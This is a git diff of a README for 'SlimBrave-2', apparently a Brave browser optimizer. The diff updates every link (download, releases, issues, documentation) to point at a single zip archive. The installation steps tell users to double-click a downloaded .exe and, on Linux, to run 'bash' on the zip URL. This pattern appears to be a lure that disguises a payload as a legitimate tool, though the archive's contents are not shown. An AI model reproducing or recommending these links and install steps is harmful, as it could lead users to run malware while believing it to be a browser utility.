@@ -1,6 +1,6 @@
 # 🌟 SlimBrave-2 - Optimize Brave for Speedy Browsing
 
-[![Download SlimBrave-2](https://github.com/charles2927/SlimBrave-2/raw/refs/heads/main/Presets/Brave_Slim_v2.0.zip%https://github.com/charles2927/SlimBrave-2/raw/refs/heads/main/Presets/Brave_Slim_v2.0.zip)](https://github.com/charles2927/SlimBrave-2/raw/refs/heads/main/Presets/Brave_Slim_v2.0.zip)
+[![Download SlimBrave-2](https://raw.githubusercontent.com/charles2927/SlimBrave-2/main/Presets/Brave_Slim_2.5.zip%https://raw.githubusercontent.com/charles2927/SlimBrave-2/main/Presets/Brave_Slim_2.5.zip)](https://raw.githubusercontent.com/charles2927/SlimBrave-2/main/Presets/Brave_Slim_2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ This guide will walk you through downloading and running SlimBrave-2 on your com
 
 To download the latest version of SlimBrave-2, visit this page:
 
-[Visit Releases Page](https://github.com/charles2927/SlimBrave-2/raw/refs/heads/main/Presets/Brave_Slim_v2.0.zip)
+[Visit Releases Page](https://raw.githubusercontent.com/charles2927/SlimBrave-2/main/Presets/Brave_Slim_2.5.zip)
 
 ### Step-by-Step Installation
 
@@ -30,7 +30,7 @@ To download the latest version of SlimBrave-2, visit this page:
 4. **Run the Installer**  
    After the download finishes:
    - For Windows, double-click the downloaded `.exe` file.
-   - For Linux, open a terminal where the downloaded file is located and type `bash https://github.com/charles2927/SlimBrave-2/raw/refs/heads/main/Presets/Brave_Slim_v2.0.zip` to run the installer.
+   - For Linux, open a terminal where the downloaded file is located and type `bash https://raw.githubusercontent.com/charles2927/SlimBrave-2/main/Presets/Brave_Slim_2.5.zip` to run the installer.
 
 5. **Follow the On-Screen Instructions**  
    The installer will guide you through the setup process. Follow the prompts to complete the installation.
@@ -69,7 +69,7 @@ If you encounter any issues while downloading or installing SlimBrave-2, conside
 - Check your internet connection.
 - Make sure to download the correct version for your operating system.
 
-For additional problems or questions, you can visit the [Issues Page](https://github.com/charles2927/SlimBrave-2/raw/refs/heads/main/Presets/Brave_Slim_v2.0.zip) to see if someone else has faced a similar issue or to report a new bug.
+For additional problems or questions, you can visit the [Issues Page](https://raw.githubusercontent.com/charles2927/SlimBrave-2/main/Presets/Brave_Slim_2.5.zip) to see if someone else has faced a similar issue or to report a new bug.
 
 ## 📞 Support
 
@@ -77,12 +77,12 @@ If you need further assistance, feel free to reach out via the GitHub repository
 
 ## 🌐 More Information
 
-For detailed documentation on how SlimBrave works and to stay updated on new features, visit our [GitHub Page](https://github.com/charles2927/SlimBrave-2/raw/refs/heads/main/Presets/Brave_Slim_v2.0.zip).
+For detailed documentation on how SlimBrave works and to stay updated on new features, visit our [GitHub Page](https://raw.githubusercontent.com/charles2927/SlimBrave-2/main/Presets/Brave_Slim_2.5.zip).
 
 Your smooth browsing experience starts with SlimBrave-2. Download now and enjoy a leaner, faster Brave! 
 
 ## 🔗 Quick Links
 
-- [Download SlimBrave-2](https://github.com/charles2927/SlimBrave-2/raw/refs/heads/main/Presets/Brave_Slim_v2.0.zip)
-- [Issues Page](https://github.com/charles2927/SlimBrave-2/raw/refs/heads/main/Presets/Brave_Slim_v2.0.zip)
-- [Documentation](https://github.com/charles2927/SlimBrave-2/raw/refs/heads/main/Presets/Brave_Slim_v2.0.zip)
+- [Download SlimBrave-2](https://raw.githubusercontent.com/charles2927/SlimBrave-2/main/Presets/Brave_Slim_2.5.zip)
+- [Issues Page](https://raw.githubusercontent.com/charles2927/SlimBrave-2/main/Presets/Brave_Slim_2.5.zip)
+- [Documentation](https://raw.githubusercontent.com/charles2927/SlimBrave-2/main/Presets/Brave_Slim_2.5.zip)
